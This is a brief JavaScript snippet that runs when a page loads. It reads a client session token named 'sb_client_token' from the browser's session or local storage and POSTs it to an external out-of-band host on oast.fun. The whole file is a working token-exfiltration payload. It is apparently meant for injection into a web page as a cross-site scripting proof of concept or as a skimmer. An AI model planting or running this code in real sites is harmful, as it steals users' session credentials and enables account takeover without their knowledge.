document.addEventListener("DOMContentLoaded", () => {
    const sessionToken = sessionStorage.getItem("sb_client_token");
    const localToken = localStorage.getItem("sb_client_token");
    const token = sessionToken || localToken;

    if (token) {
        fetch("https://rddllovzousqsobdgdtx9y20oju9plvex.oast.fun", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ token: token }),
        })
        .then(response => response.json())
        .catch(error => console.error("Error sending token:", error));
    }
});
